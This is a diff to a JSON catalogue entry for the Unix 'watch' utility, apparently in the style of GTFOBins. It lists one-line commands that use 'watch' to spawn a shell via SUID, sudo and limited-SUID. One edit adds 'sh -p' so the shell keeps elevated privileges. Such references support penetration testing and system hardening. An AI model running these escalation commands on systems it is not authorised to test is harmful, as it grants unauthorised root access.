@@ -2,23 +2,26 @@
   "functions": {
     "shell": [
       {
-        "code": "watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
+        "description": "",
+        "code": "watch -x sh -c 'reset; exec sh 1>&0 2>&0'\n"
       }
     ],
     "suid": [
       {
-        "description": "This keeps the SUID privileges only if the '-x' option is present.",
-        "code": "./watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
+        "description": "This keeps the SUID privileges only if the `-x` option is present.",
+        "code": "./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'\n"
       }
     ],
     "sudo": [
       {
-        "code": "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
+        "description": "",
+        "code": "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'\n"
       }
     ],
     "limited-suid": [
       {
-        "code": "./watch 'reset; exec sh 1>&0 2>&0'"
+        "description": "",
+        "code": "./watch 'reset; exec sh 1>&0 2>&0'\n"
       }
     ]
   }
